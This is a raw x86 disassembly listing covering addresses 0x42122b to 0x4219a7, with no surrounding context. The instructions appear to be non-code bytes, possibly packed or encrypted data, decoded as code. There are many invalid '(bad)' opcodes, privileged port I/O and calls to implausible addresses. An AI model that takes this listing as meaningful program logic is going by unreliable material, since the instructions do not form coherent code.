  42122b:	dec    ebx
  42122c:	mov    eax,fs
  42122e:	cmp    al,0x99
  421230:	dec    edx
  421231:	and    esp,0x30
  421234:	imul   eax,ecx,0x91e79845
  42123a:	adc    ah,BYTE PTR [edx]
  42123c:	dec    edi
  42123d:	cwde   
  42123e:	test   al,0x34
  421240:	lods   eax,DWORD PTR ds:[esi]
  421241:	call   0xdf5ca6d9
  421246:	mov    dl,BYTE PTR [ecx-0x55]
  421249:	xchg   ecx,eax
  42124a:	mov    dl,BYTE PTR [eax+0x25]
  42124d:	xor    eax,DWORD PTR [edx]
  42124f:	mov    eax,ds:0xd0220b1f
  421254:	adc    dl,0x83
  421257:	ret    
  421258:	cmp    BYTE PTR [ecx+0x1c91a8f0],bl
  42125e:	and    edi,edi
  421260:	and    al,BYTE PTR [ecx]
  421262:	cli    
  421263:	fistp  DWORD PTR [eax-0x19]
  421266:	xchg   esi,eax
  421267:	add    ebx,0xfffffffc
  42126a:	xlat   BYTE PTR ds:[ebx]
  42126b:	pop    eax
  42126c:	out    dx,eax
  42126d:	test   eax,0xd1f03d6
  421272:	sub    esi,ebp
  421274:	adc    al,0xbb
  421276:	inc    edi
  421277:	rcl    BYTE PTR [ebx-0x14],1
  42127a:	pop    es
  42127b:	push   ecx
  42127c:	fadd   st(0),st
  42127e:	dec    edx
  42127f:	jo     0x4212f1
  421281:	mov    BYTE PTR ds:0x52fbb3e7,ch
  421287:	mov    dh,0x48
  421289:	mov    al,0xaf
  42128b:	shr    DWORD PTR [ebx],cl
  42128d:	inc    esp
  42128e:	or     BYTE PTR [edi+0x4367f694],ch
  421294:	cmp    esp,DWORD PTR [ecx+0x2cfe0490]
  42129a:	add    esi,DWORD PTR [ebx-0x37]
  42129d:	dec    edx
  42129e:	fisubr WORD PTR [esi]
  4212a0:	xchg   DWORD PTR [ebp-0x3feb0ca0],ebp
  4212a6:	mov    ss,WORD PTR [esi-0x45e8beb4]
  4212ac:	pop    edi
  4212ad:	dec    edx
  4212ae:	cmp    eax,0xbbaa8942
  4212b3:	mov    bh,0x24
  4212b5:	dec    ecx
  4212b6:	imul   ebp,DWORD PTR [ecx],0x4a92b160
  4212bc:	mov    ebp,0x1b0b4bd7
  4212c1:	dec    ecx
  4212c2:	pop    edi
  4212c3:	and    edi,DWORD PTR [eax+ecx*2-0x48]
  4212c7:	in     al,0xf3
  4212c9:	cmp    al,0xef
  4212cb:	push   cs
  4212cc:	les    eax,FWORD PTR [esi]
  4212ce:	(bad)  
  4212cf:	call   0x9d661fce
  4212d4:	cmp    al,0xef
  4212d6:	mov    eax,fs:0x342a1e1c
  4212dc:	inc    edx
  4212dd:	out    0x79,eax
  4212df:	sahf   
  4212e0:	out    0x6,eax
  4212e2:	dec    ebx
  4212e3:	pop    edx
  4212e4:	imul   edi,DWORD PTR [eax-0x7a],0x9e0f76f0
  4212eb:	xchg   ebp,eax
  4212ec:	jmp    0xe397b05d
  4212f1:	jo     0x42134c
  4212f3:	pop    ss
  4212f4:	fs xchg esi,eax
  4212f6:	and    DWORD PTR [ecx],edx
  4212f8:	mov    ecx,0x85022313
  4212fd:	in     al,0x48
  4212ff:	mov    es,WORD PTR [edx+ecx*1]
  421302:	or     eax,0xca3bc5b3
  421307:	pop    ds
  421308:	xchg   esp,eax
  421309:	(bad)  
  42130a:	mov    eax,0x40bec15d
  42130f:	hlt    
  421310:	adc    bl,BYTE PTR [eax+0x28cb6659]
  421316:	jmp    0x421385
  421318:	das    
  421319:	sti    
  42131a:	rcr    DWORD PTR [edx+0x11555fee],0xc8
  421321:	push   esi
  421322:	(bad)
  421325:	mov    edx,0x36921d08
  42132a:	and    DWORD PTR [ebx],eax
  42132c:	cmp    BYTE PTR [ecx],ch
  42132e:	xchg   BYTE PTR [edx],al
  421330:	pop    eax
  421331:	or     DWORD PTR [ebp+0x6c],0xc10c391b
  421338:	lods   eax,DWORD PTR ds:[esi]
  421339:	push   0x24
  42133b:	xchg   DWORD PTR ds:0x8a1f24be,eax
  421341:	xchg   edi,eax
  421342:	xchg   edx,eax
  421343:	pop    ss
  421344:	das    
  421345:	add    DWORD PTR ds:0x255fc0d,esp
  42134b:	jns    0x421391
  42134d:	xor    DWORD PTR [eax],ecx
  42134f:	and    eax,0x31625e9c
  421354:	add    eax,0x2f7e9cd9
  421359:	push   0xffffff92
  42135b:	xor    al,0x82
  42135d:	ins    BYTE PTR es:[edi],dx
  42135e:	xor    al,0x16
  421360:	fisttp QWORD PTR [edi]
  421362:	sub    esi,DWORD PTR [edi+0x14]
  421365:	adc    DWORD PTR [ebx-0xa],edi
  421368:	sub    ebx,0xb7b6eb19
  42136e:	xor    DWORD PTR [ebp+0x3325c00d],eax
  421374:	fistp  DWORD PTR [edi+edi*2-0x2f]
  421378:	cs lock imul esp,edx,0xd65ecb78
  421380:	sbb    ch,bl
  421382:	mov    esp,0xc4fc769
  421387:	sub    ecx,DWORD PTR [edi-0x6d]
  42138a:	pushf  
  42138b:	xor    eax,0x1ce05fa1
  421390:	pop    edi
  421391:	sub    ebx,ecx
  421393:	push   edi
  421394:	xchg   esi,eax
  421395:	dec    esp
  421396:	adc    al,0x30
  421398:	jnp    0x42139d
  42139a:	inc    edi
  42139b:	adc    BYTE PTR [ecx],al
  42139d:	cmp    cl,BYTE PTR [esi+0x5f]
  4213a0:	pop    edi
  4213a1:	add    BYTE PTR [ebx],dh
  4213a3:	add    eax,0x16105d96
  4213a8:	mov    al,0x5
  4213aa:	push   cs
  4213ab:	mov    ebx,0xe317c61c
  4213b0:	ss jno 0x42137e
  4213b3:	push   ss
  4213b4:	mov    al,0xe
  4213b6:	lahf   
  4213b7:	dec    esi
  4213b8:	or     BYTE PTR [edi-0x6fcfe2b8],bl
  4213be:	je     0x4213ef
  4213c0:	inc    edi
  4213c1:	and    DWORD PTR [edi],0x52
  4213c4:	aad    0x7c
  4213c6:	mov    dl,0x32
  4213c8:	push   ecx
  4213c9:	xchg   esi,eax
  4213ca:	mov    ds:0x735c7423,al
  4213cf:	adc    eax,0x463a0a7c
  4213d4:	or     BYTE PTR [edi+0x17],ch
  4213d7:	jmp    0x421428
  4213d9:	dec    ebp
  4213da:	or     DWORD PTR [ebx+edi*8+0x53],0x7f4a9210
  4213e2:	sbb    DWORD PTR [edx+0x24016f06],esi
  4213e8:	adc    ebp,esp
  4213ea:	xchg   ebx,eax
  4213eb:	jmp    0x421404
  4213ed:	mov    dl,0xc
  4213ef:	mov    eax,ds:0x3b01afd6
  4213f4:	mov    eax,ds:0x26a54f07
  4213f9:	or     eax,0x79083430
  4213fe:	cmp    al,0x61
  421400:	(bad)  
  421401:	enter  0xa1,0x66
  421405:	les    esi,FWORD PTR [bx-0x54]
  421409:	es add al,0x2b
  42140c:	add    eax,DWORD PTR [edi+0x51]
  42140f:	loopne 0x421430
  421411:	pop    ss
  421412:	inc    ecx
  421413:	aas    
  421414:	mov    dl,0xd1
  421416:	push   es
  421417:	push   0x8e687d60
  42141c:	je     0x421436
  42141e:	mov    eax,0xffdc74f8
  421423:	mov    ds:0xa0684848,eax
  421428:	sti    
  421429:	xor    al,BYTE PTR [ebx-0x1efff4c3]
  42142f:	mov    eax,0x734032c7
  421434:	sbb    BYTE PTR [bx+di+0x783a],ah
  421439:	xchg   edi,eax
  42143a:	rcr    BYTE PTR ss:[ebp+0x57],0xa1
  42143f:	push   eax
  421440:	add    cl,BYTE PTR [ebx+0x1e]
  421443:	pop    esp
  421444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421445:	imul   esp,DWORD PTR [edi],0x5488938c
  42144b:	mov    edx,0xb8730b15
  421450:	push   eax
  421451:	add    BYTE PTR [eax-0x12],ch
  421454:	jnp    0x4214c6
  421456:	daa    
  421457:	xchg   edi,eax
  421458:	outs   dx,BYTE PTR ds:[esi]
  421459:	pop    ebx
  42145a:	dec    eax
  42145b:	push   eax
  42145c:	and    ebx,DWORD PTR [eax+0x40]
  42145f:	and    BYTE PTR [edx],0x97
  421462:	rol    bl,1
  421464:	push   es
  421465:	in     eax,dx
  421466:	adc    al,0x9e
  421468:	inc    ecx
  421469:	ds push ds
  42146b:	sub    al,0x28
  42146d:	inc    ecx
  42146e:	dec    esp
  42146f:	jge    0x421478
  421471:	loopne 0x421429
  421473:	adc    eax,0x44a14a49
  421478:	and    BYTE PTR [ebp+0x5a],bh
  42147b:	xor    ch,al
  42147d:	add    ebp,edx
  42147f:	pop    ss
  421480:	adc    dl,dh
  421482:	pusha  
  421483:	xchg   edi,eax
  421484:	add    al,0xe
  421486:	icebp  
  421487:	mov    eax,0x7b45b804
  42148c:	ss imul ebp,edi,0x8df848f4
  421493:	sbb    BYTE PTR [eax+0x1254321f],0xed
  42149a:	das    
  42149b:	fwait
  42149c:	xchg   ecx,eax
  42149d:	inc    esp
  42149e:	inc    edx
  42149f:	and    BYTE PTR [edi],0x40
  4214a2:	fs mov eax,0x43b5390
  4214a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a9:	jbe    0x421436
  4214ab:	xchg   ecx,eax
  4214ac:	clc    
  4214ad:	mov    eax,0x22c15958
  4214b2:	leave  
  4214b3:	inc    ebx
  4214b4:	ins    DWORD PTR es:[edi],dx
  4214b5:	xor    ebp,DWORD PTR [eax]
  4214b7:	inc    ecx
  4214b8:	push   es
  4214b9:	pop    edi
  4214ba:	xchg   ebp,eax
  4214bb:	or     esp,DWORD PTR [ecx+0x4c6fc173]
  4214c1:	popa   
  4214c2:	iret   
  4214c3:	adc    cl,BYTE PTR [esi-0x343b668b]
  4214c9:	pop    esp
  4214ca:	pop    eax
  4214cb:	push   0xfffffffb
  4214cd:	imul   eax,DWORD PTR [ecx],0xffffff9f
  4214d0:	inc    eax
  4214d1:	test   al,0x30
  4214d3:	push   esp
  4214d4:	je     0x4214d9
  4214d6:	sub    edx,0xffffffd4
  4214d9:	ret    
  4214da:	clc    
  4214db:	push   edx
  4214dc:	dec    ebp
  4214dd:	sbb    al,0x1c
  4214df:	dec    edx
  4214e0:	enter  0x9cec,0xa3
  4214e4:	and    ecx,edi
  4214e6:	in     eax,0x33
  4214e8:	pop    ebp
  4214e9:	and    BYTE PTR [ebp+esi*8-0xe],bh
  4214ed:	or     BYTE PTR [ebx+0x4725a50],ah
  4214f3:	push   es
  4214f4:	aad    0x29
  4214f6:	enter  0x8372,0xb9
  4214fa:	adc    BYTE PTR [edi],bh
  4214fc:	xchg   edi,eax
  4214fd:	xchg   edi,eax
  4214fe:	stc    
  4214ff:	enter  0x557,0x5d
  421503:	js     0x42150c
  421505:	add    BYTE PTR [ecx],ch
  421507:	inc    ecx
  421508:	mov    edi,edi
  42150a:	stos   DWORD PTR es:[edi],eax
  42150b:	dec    esp
  42150c:	js     0x42151e
  42150e:	add    DWORD PTR cs:[esi],eax
  421511:	push   esp
  421512:	inc    ebx
  421513:	outs   dx,DWORD PTR ds:[esi]
  421514:	ins    BYTE PTR es:[edi],dx
  421515:	outs   dx,DWORD PTR ds:[esi]
  421516:	jb     0x42158f
  421518:	lock nop
  42151a:	xor    edx,edi
  42151c:	dec    eax
  42151d:	(bad)  
  42151e:	sub    BYTE PTR [edi],ch
  421520:	call   0xcba1fa0
  421525:	push   esp
  421526:	inc    esi
  421527:	outs   dx,DWORD PTR ds:[esi]
  421528:	lahf   
  421529:	jb     0x42159e
  42152b:	gs je  0x42152f
  42152e:	add    ch,ch
  421530:	sahf   
  421531:	and    esi,DWORD PTR [edi+edi*8-0x3fec974]
  421538:	push   ebp
  421539:	xchg   ecx,esp
  42153b:	aas    
  42153c:	out    dx,eax
  42153d:	fsubr  QWORD PTR [ecx]
  42153f:	inc    ecx
  421540:	add    BYTE PTR [eax],dl
  421542:	mov    WORD PTR [esp+edi*8-0x21],fs
  421546:	jae    0x4215b7
  421548:	jne    0x4215bc
  42154a:	arpl   WORD PTR [ebp+0x4d],sp
  42154d:	popa   
  42154e:	outs   dx,BYTE PTR ds:[esi]
  42154f:	popa   
  421550:	addr16 lahf 
  421552:	push   esp
  421553:	les    edx,FWORD PTR [ebx-0x7d]
  421556:	ror    DWORD PTR [ecx+0x711d204e],0x2b
  42155d:	es and dh,bh
  421560:	jbe    0x421584
  421562:	add    al,BYTE PTR [esi-0x7f]
  421565:	mov    esi,DWORD PTR [edi]
  421567:	xchg   edx,eax
  421568:	push   ss
  421569:	add    al,0xc6
  42156b:	pop    ds
  42156c:	jo     0x421501
  42156e:	mov    edi,0x6307aef9
  421573:	ins    BYTE PTR es:[edi],dx
  421574:	inc    edx
  421575:	ins    BYTE PTR es:[edi],dx
  421576:	popa   
  421577:	arpl   WORD PTR [ebx+0x1e],bp
  42157a:	cmp    dh,dh
  42157c:	pusha  
  42157d:	pop    eax
  42157e:	ss jb  0x4215f0
  421581:	adc    al,BYTE PTR [ecx]
  421583:	inc    edi
  421584:	inc    edi
  421585:	sbb    DWORD PTR [edi+0x6e841b55],ebp
  42158b:	pop    ds
  42158c:	dec    edi
  42158d:	ins    BYTE PTR es:[edi],dx
  42158e:	push   DWORD PTR [esi]
  421590:	dec    ecx
  421591:	sub    bh,BYTE PTR [edi+ecx*1]
  421594:	xchg   BYTE PTR [esi+0x61],cl
  421597:	jbe    0x421612
  421599:	add    BYTE PTR [edi+0x5025fe4d],bh
  42159f:	jne    0x421613
  4215a1:	jo     0x42160f
  4215a3:	gs inc edi
  4215a5:	push   esp
  4215a6:	gs popa 
  4215a8:	ins    BYTE PTR es:[edi],dx
  4215a9:	stc    
  4215aa:	pop    es
  4215ab:	jnp    0x421618
  4215ad:	pop    ds
  4215ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215af:	popa   
  4215b0:	addr16 push ebx
  4215b2:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x586b0772
  4215ba:	push   es
  4215bb:	add    eax,0x4c87645e
  4215c0:	mov    al,0xe4
  4215c2:	paddsb mm5,QWORD PTR [ecx+0x6d]
  4215c6:	gs iret 
  4215c8:	pop    ecx
  4215c9:	gs ins BYTE PTR es:[edi],dx
  4215cb:	ins    BYTE PTR es:[edi],dx
  4215cc:	outs   dx,DWORD PTR ds:[esi]
  4215cd:	ja     0x42155f
  4215cf:	push   DWORD PTR [edx+0x7b]
  4215d2:	lahf   
  4215d3:	jne    0x42161c
  4215d5:	or     DWORD PTR [esi+0x75],eax
  4215d8:	arpl   WORD PTR [eax+0x73],bp
  4215db:	imul   esp,DWORD PTR [ecx-0x1b],0x413ee1a7
  4215e2:	jno    0x421659
  4215e4:	and    BYTE PTR [edi],al
  4215e6:	push   edi
  4215e7:	push   0x36657469
  4215ec:	rol    DWORD PTR [esi+0x65000cc8],0x79
  4215f3:	jmp    0xd6c6acf8
  4215f8:	mov    dl,0x7
  4215fa:	push   ebx
  4215fb:	imul   edi,DWORD PTR [ecx-0x43],0x77
  4215ff:	and    eax,0x9c3b5c10
  421604:	ins    DWORD PTR es:[edi],dx
  421605:	inc    edi
  421606:	dec    ebp
  421607:	data16 mov ch,0x52
  42160a:	jp     0x421644
  42160c:	repnz fisttp WORD PTR [esi]
  42160f:	arpl   WORD PTR [eax+eiz*2+0x42],si
  421613:	(bad)  
  421614:	dec    ebx
  421615:	mov    esi,0x2fc25e81
  42161a:	cmovae esp,DWORD PTR [ecx-0x6c]
  42161e:	push   cs
  42161f:	int3   
  421620:	push   ebx
  421621:	call   FWORD PTR [edi+0x70]
  421624:	jo     0x421639
  421626:	cmp    BYTE PTR [eax-0x58],al
  421629:	mov    eax,0xcb76b6b
  42162e:	sub    al,0x34
  421630:	and    dl,BYTE PTR cs:[edi+eiz*2+0x70]
  421635:	outs   dx,BYTE PTR ds:[esi]
  421636:	fs mov bh,0xf6
  421639:	adc    DWORD PTR ds:[edi],ebp
  42163c:	inc    edx
  42163d:	je     0x4216ad
  42163f:	inc    esi
  421640:	push   ebp
  421641:	xchg   DWORD PTR [esi],esp
  421643:	push   0x48fbd990
  421648:	imul   esp,DWORD PTR [edi+0x68],0x2f74066c
  42164f:	or     edx,DWORD PTR [ebx+0x27]
  421652:	aas    
  421653:	fsub   DWORD PTR [ecx+0x7f6c64ca]
  421659:	push   esp
  42165a:	gs js  0x4216d1
  42165d:	or     eax,0x2c16d6cf
  421662:	sub    ebp,DWORD PTR [edi]
  421664:	push   edi
  421665:	inc    esp
  421666:	gs data16 (bad) 
  421669:	mov    eax,ds:0x7561e418
  42166e:	ins    BYTE PTR es:[edi],dx
  42166f:	pop    ss
  421670:	xchg   edi,eax
  421671:	imul   eax,DWORD PTR fs:[edi],0x2a9c0a9b
  421678:	lahf   
  421679:	sbb    DWORD PTR [edi],edi
  42167b:	dec    ecx
  42167c:	fs mov es,ecx
  42167f:	inc    esp
  421680:	in     al,dx
  421681:	inc    ebx
  421682:	pop    ds
  421683:	or     dl,BYTE PTR [edx-0x50]
  421686:	xor    BYTE PTR [edi],0xd9
  421689:	push   edi
  42168a:	or     DWORD PTR [edi+0x7b],0xf27e909
  421691:	pop    ecx
  421692:	jg     0x4216dc
  421694:	outs   dx,DWORD PTR ds:[esi]
  421695:	je     0x4216a4
  421697:	outs   dx,DWORD PTR ds:[esi]
  421698:	cdq    
  421699:	or     BYTE PTR [edi+edx*8+0x10],0xdf
  42169e:	repz adc eax,DWORD PTR [ebx+ecx*8]
  4216a2:	ins    BYTE PTR es:[edi],dx
  4216a3:	aaa    
  4216a4:	adc    DWORD PTR [edi],edx
  4216a6:	adc    eax,0x6010d76f
  4216ab:	aaa    
  4216ac:	pop    es
  4216ad:	or     BYTE PTR [edi],bh
  4216af:	outs   dx,WORD PTR ds:[esi]
  4216b1:	add    eax,0x42a66e43
  4216b6:	push   0xde7f0a27
  4216bb:	sbb    bl,dh
  4216bd:	xor    DWORD PTR [esi],eax
  4216bf:	pop    ss
  4216c0:	outs   dx,BYTE PTR ds:[esi]
  4216c1:	jne    0x42173a
  4216c3:	pop    ds
  4216c4:	xor    ah,ah
  4216c6:	sbb    ebp,DWORD PTR [eax]
  4216c8:	xchg   BYTE PTR [eax],dl
  4216ca:	daa    
  4216cb:	nop    edx
  4216ce:	fadd   DWORD PTR [edi+ecx*8+0xa]
  4216d2:	das    
  4216d3:	lahf   
  4216d4:	dec    esi
  4216d5:	xchg   ebx,eax
  4216d6:	jecxz  0x421698
  4216d8:	xor    BYTE PTR [esi],ch
  4216da:	aas    
  4216db:	push   ebx
  4216dc:	arpl   WORD PTR [eax],bx
  4216de:	add    bl,BYTE PTR [eax-0xf]
  4216e1:	jmp    0x42171b
  4216e3:	mov    ds:0x44443347,al
  4216e8:	imul   eax,ecx,0x15
  4216eb:	ins    BYTE PTR es:[edi],dx
  4216ec:	jo     0x421699
  4216ee:	outs   dx,DWORD PTR ds:[esi]
  4216ef:	das    
  4216f0:	cmp    eax,0xbb5c528f
  4216f5:	not    BYTE PTR [edi+0x69]
  4216f8:	outs   dx,BYTE PTR ds:[esi]
  4216f9:	dec    edi
  4216fa:	or     eax,0xb81a4627
  4216ff:	and    DWORD PTR [ebx+0x73],ebx
  421702:	aad    0xaf
  421704:	das    
  421705:	adc    eax,0xa101e500
  42170a:	adc    ah,al
  42170c:	or     ebx,ebx
  42170e:	ror    BYTE PTR [edi],cl
  421710:	mov    esp,0x6a4ba3e9
  421715:	xor    edi,DWORD PTR [ecx-0x27102240]
  42171b:	cmp    ebp,ecx
  42171d:	sbb    bh,bh
  42171f:	pop    ds
  421720:	out    dx,al
  421721:	fmul   QWORD PTR [edi-0x1e501]
  421727:	inc    ecx
  421728:	dec    esi
  421729:	push   ebx
  42172a:	dec    ecx
  42172b:	pop    edi
  42172c:	inc    ebx
  42172d:	dec    eax
  42172e:	inc    ecx
  42172f:	push   edx
  421730:	push   ebx
  421731:	inc    ebp
  421732:	push   esp
  421733:	add    BYTE PTR [edi],cl
  421735:	inc    esp
  421736:	inc    ebp
  421737:	inc    esi
  421738:	inc    ecx
  421739:	push   ebp
  42173a:	dec    esp
  42173b:	ficomp DWORD PTR [edi]
  42173d:	mov    ds:0x8f3554b1,al
  421742:	push   ebx
  421743:	pop    ecx
  421744:	dec    ebp
  421745:	inc    edx
  421746:	dec    edi
  421747:	dec    esp
  421748:	arpl   bp,sp
  42174a:	pusha  
  42174b:	cmovno esi,edi
  42174e:	dec    ebp
  42174f:	inc    ecx
  421750:	inc    ebx
  421751:	push   edi
  421752:	adc    ah,ch
  421754:	push   ss
  421755:	pusha  
  421756:	jg     0x4217a0
  421758:	dec    ecx
  421759:	inc    esi
  42175a:	push   esp
  42175b:	dec    edx
  42175c:	dec    ecx
  42175d:	push   ebx
  42175e:	mov    edi,0x45474e22
  421763:	shr    BYTE PTR [ebp+0x67c1cfb5],0xd
  42176a:	dec    edx
  42176b:	dec    edi
  42176c:	and    BYTE PTR [edx+0x61],al
  42176f:	jns    0x421784
  421771:	repnz xchg edi,ebp
  421774:	inc    edi
  421775:	inc    edx
  421776:	xor    dh,BYTE PTR [ebx]
  421778:	xor    DWORD PTR [edx],esi
  42177a:	adc    eax,esi
  42177c:	inc    ebx
  42177d:	in     al,0x8f
  42177f:	div    BYTE PTR [esi+0x4222454e]
  421785:	dec    ecx
  421786:	inc    edi
  421787:	xor    eax,0x45524797
  42178c:	inc    ebp
  42178d:	dec    ebx
  42178e:	and    edi,ecx
  421790:	sbb    ebp,DWORD PTR [edi+esi*4]
  421793:	push   esp
  421794:	push   ebp
  421795:	push   edx
  421796:	dec    ebx
  421797:	dec    ecx
  421798:	push   ebx
  421799:	dec    eax
  42179a:	imul   ebx,ebx,0x5a
  42179d:	mov    bl,0x48
  42179f:	mov    WORD PTR [edx+0x57],fs
  4217a2:	(bad)  
  4217a3:	das    
  4217a4:	sbb    al,0x41
  4217a6:	mov    esi,0x5a9f242e
  4217ab:	inc    ebx
  4217ac:	das    
  4217ad:	inc    edx
  4217ae:	inc    ecx
  4217af:	dec    esp
  4217b0:	push   esp
  4217b1:	mov    edi,0xfe40ee68
  4217b6:	push   edx
  4217b7:	push   ebp
  4217b8:	push   ebx
  4217b9:	push   ebx
  4217ba:	dec    ecx
  4217bb:	inc    ecx
  4217bc:	dec    esi
  4217bd:	or     al,0xef
  4217bf:	push   ds
  4217c0:	dec    ecx
  4217c1:	js     0x4217b6
  4217c3:	addr16 push 0x41451217
  4217c9:	push   ebx
  4217ca:	push   esp
  4217cb:	push   edx
  4217cc:	dec    edi
  4217cd:	push   eax
  4217ce:	inc    ebp
  4217cf:	loop   0x4217e0
  4217d1:	jns    0x42183d
  4217d3:	scas   eax,DWORD PTR es:[edi]
  4217d4:	dec    edi
  4217d5:	inc    ebp
  4217d6:	dec    ebp
  4217d7:	push   0x11
  4217d9:	mov    ecx,0xac255560
  4217de:	loop   0x42178d
  4217e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217e1:	pop    ds
  4217e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217e3:	inc    esp
  4217e4:	shr    DWORD PTR [edx],cl
  4217e6:	or     eax,0x4b4b4c7
  4217eb:	mov    eax,0x230e30bc
  4217f0:	dec    BYTE PTR [ecx]
  4217f2:	in     eax,0x31
  4217f4:	xchg   ebx,eax
  4217f5:	inc    ebx
  4217f6:	adc    BYTE PTR [esi-0x3],cl
  4217f9:	inc    eax
  4217fa:	js     0x4217ff
  4217fc:	sub    cl,BYTE PTR [edi]
  4217fe:	test   DWORD PTR [ebx],esi
  421800:	add    eax,ebx
  421802:	mov    al,0x24
  421804:	fst    QWORD PTR [ebp-0x3e6fe38]
  42180a:	push   ebp
  42180b:	mov    ebp,0x490fb049
  421810:	out    0xef,al
  421812:	add    BYTE PTR [ebx],cl
  421814:	je     0x4217c1
  421816:	push   esp
  421817:	call   0xccc8:0xc408ac83
  42181e:	div    DWORD PTR cs:[esi-0x1d]
  421822:	push   esi
  421824:	inc    eax
  421825:	sbb    DWORD PTR [ecx],eax
  421827:	je     0x421832
  421829:	mov    DWORD PTR [ebp-0x30],0x7ebc0bc
  421830:	adc    BYTE PTR [eax+0x124dd9aa],dl
  421836:	xor    WORD PTR [edx],ax
  421839:	mov    edx,0x19d44588
  42183e:	jle    0x42186e
  421840:	and    edx,DWORD PTR [edi-0x29f72afc]
  421846:	mov    al,BYTE PTR [eax+0x1a]
  421849:	fsub   QWORD PTR [ecx]
  42184b:	xor    ebp,edx
  42184d:	adc    bh,dl
  42184f:	pop    eax
  421850:	mov    BYTE PTR [ebx-0x1df6e43e],0x76
  421857:	dec    ebp
  421858:	out    dx,eax
  421859:	sbb    bh,BYTE PTR [edx+0x3d1231fc]
  42185f:	push   edx
  421860:	mov    DWORD PTR [edi+0x1a],0xf67d9f2a
  421867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421868:	xchg   esi,eax
  421869:	loopne 0x4218a5
  42186b:	mov    ah,0x54
  42186d:	adc    al,0x63
  42186f:	enter  0x19eb,0x70
  421873:	test   BYTE PTR [ecx-0x26],0x92
  421877:	mov    ah,0x34
  421879:	mov    ah,0xc6
  42187b:	inc    ebp
  42187c:	fiadd  DWORD PTR [eax]
  42187e:	push   es
  42187f:	test   eax,esi
  421881:	xor    ebx,DWORD PTR [esi+0x2259d9d8]
  421887:	add    BYTE PTR [edx+0x5d026f7e],dh
  42188d:	push   es
  42188e:	push   es
  42188f:	loopne 0x4218b9
  421891:	fild   DWORD PTR [edx]
  421893:	jmp    0x42189f
  421895:	or     al,BYTE PTR [ecx]
  421897:	jmp    0x42189d
  421899:	sti    
  42189a:	je     0x4218ae
  42189c:	jo     0x421824
  42189e:	outs   dx,DWORD PTR ds:[esi]
  42189f:	sbb    BYTE PTR [esi-0x5a6cf7bd],dl
  4218a5:	mov    ah,0x73
  4218a7:	les    edi,FWORD PTR [ebx]
  4218a9:	jno    0x4218c3
  4218ab:	push   es
  4218ac:	or     BYTE PTR [ecx+0x1a],al
  4218af:	or     BYTE PTR [edi+0xeb4e20f],ah
  4218b5:	sbb    ebx,DWORD PTR [eax+0x49]
  4218b8:	in     al,dx
  4218b9:	xor    DWORD PTR [edx],esi
  4218bb:	lods   al,BYTE PTR ds:[esi]
  4218bc:	adc    al,0x34
  4218be:	xchg   edx,eax
  4218bf:	mov    ah,0xa9
  4218c1:	and    BYTE PTR [eax+eax*8+0x6e533722],ch
  4218c8:	inc    edx
  4218c9:	mov    eax,ds:0x18ead040
  4218ce:	pop    ss
  4218cf:	in     al,dx
  4218d0:	sbb    bh,BYTE PTR [ecx]
  4218d2:	push   eax
  4218d3:	jl     0x4218ff
  4218d5:	daa    
  4218d6:	jne    0x421950
  4218d8:	mov    eax,ds:0x32921fcc
  4218dd:	or     ecx,DWORD PTR [ecx]
  4218df:	fisttp QWORD PTR [ebx]
  4218e1:	jne    0x42191b
  4218e3:	adc    ah,dl
  4218e5:	sbb    al,0xf
  4218e7:	or     bh,BYTE PTR [eax]
  4218e9:	ins    DWORD PTR es:[edi],dx
  4218ea:	icebp  
  4218eb:	mov    bh,0x4
  4218ed:	inc    ebp
  4218ee:	lock cli 
  4218f0:	jbe    0x4218de
  4218f2:	xchg   ah,al
  4218f4:	addr16 mov cl,0xdd
  4218f7:	dec    ebp
  4218f8:	js     0x421918
  4218fa:	push   esp
  4218fb:	cmp    BYTE PTR [esi+0x32c0f217],bl
  421901:	test   eax,0xcc329928
  421906:	loopne 0x421931
  421908:	sbb    al,0x40
  42190a:	inc    eax
  42190b:	or     BYTE PTR [edi+0x6e0b92c7],bh
  421911:	and    cl,BYTE PTR [edi+edi*1+0x614667f0]
  421918:	enter  0xbbb3,0x0
  42191c:	ror    BYTE PTR [esi-0x7f],1
  42191f:	mul    DWORD PTR [eax]
  421921:	leave  
  421922:	jns    0x421957
  421924:	inc    edi
  421925:	jnp    0x4218c0
  421927:	or     DWORD PTR [ecx-0x30],0xffffff93
  42192b:	test   BYTE PTR [esi],bl
  42192d:	sub    al,0x2f
  42192f:	xor    esi,DWORD PTR [edx+0x6c678097]
  421935:	das    
  421936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421937:	(bad)  
  421938:	in     eax,0x92
  42193a:	shl    BYTE PTR [eax+esi*1+0x36],1
  42193e:	or     ebp,ebx
  421940:	push   ebp
  421941:	and    al,0x7e
  421943:	sbb    al,0x8b
  421945:	rol    BYTE PTR [eax+0x9be01ea],1
  42194b:	jmp    0x42195d
  42194d:	sub    esi,eax
  42194f:	into   
  421950:	mov    bl,0xf3
  421952:	adc    al,0xb4
  421954:	je     0x421957
  421956:	push   ds
  421957:	adc    BYTE PTR [edx],al
  421959:	jae    0x421960
  42195b:	out    dx,eax
  42195c:	xchg   ebp,eax
  42195d:	fsub   st(0),st
  42195f:	add    ah,BYTE PTR [ecx-0x33]
  421962:	hlt    
  421963:	repnz mov esp,0x10f04b90
  421969:	xor    BYTE PTR [ebx],0xd0
  42196c:	popf   
  42196d:	xor    DWORD PTR [esp+edx*1+0x6fbf01f],eax
  421974:	push   0x6f
  421976:	daa    
  421977:	push   0x43ff2bb0
  42197c:	push   eax
  42197d:	sbb    DWORD PTR [ebx-0x48],ecx
  421980:	inc    eax
  421981:	sbb    al,0xc0
  421983:	pop    eax
  421984:	pop    ebx
  421985:	jecxz  0x4219c5
  421987:	cwde   
  421988:	test   BYTE PTR [edi],al
  42198a:	mov    dl,BYTE PTR ds:0xa9d0b8e4
  421990:	cmp    bh,0xab
  421993:	and    eax,0x57006a5c
  421998:	push   esi
  421999:	pop    ecx
  42199a:	dec    ebx
  42199b:	push   0xb423947b
  4219a0:	add    al,0xff
  4219a2:	xchg   edi,eax
  4219a3:	scas   eax,DWORD PTR es:[edi]
  4219a4:	jno    0x421936
  4219a6:	xlat   BYTE PTR ds:[ebx]
  4219a7:	pop    eax
